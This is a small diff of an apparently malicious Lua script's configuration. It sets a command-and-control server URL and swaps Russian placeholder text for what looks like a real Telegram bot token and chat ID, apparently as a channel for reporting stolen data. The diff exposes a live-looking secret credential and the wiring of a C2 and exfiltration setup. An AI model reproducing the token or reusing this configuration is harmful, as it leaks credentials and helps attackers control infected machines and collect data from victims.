@@ -2,8 +2,8 @@
 
 local CONFIG = {
     C2_URL = "https://nexus-hub-c2.onrender.com",
-    TELEGRAM_TOKEN = "ВСТАВЬ_ТОКЕН",
-    TELEGRAM_CHAT = "ВСТАВЬ_CHAT_ID",
+    TELEGRAM_TOKEN = "8455099643:AAHBCduZGysWOaqks9pQT_U-riBBaCl8f5E",
+    TELEGRAM_CHAT = "7065893630",
 }
 
 -- ================= GUI =================
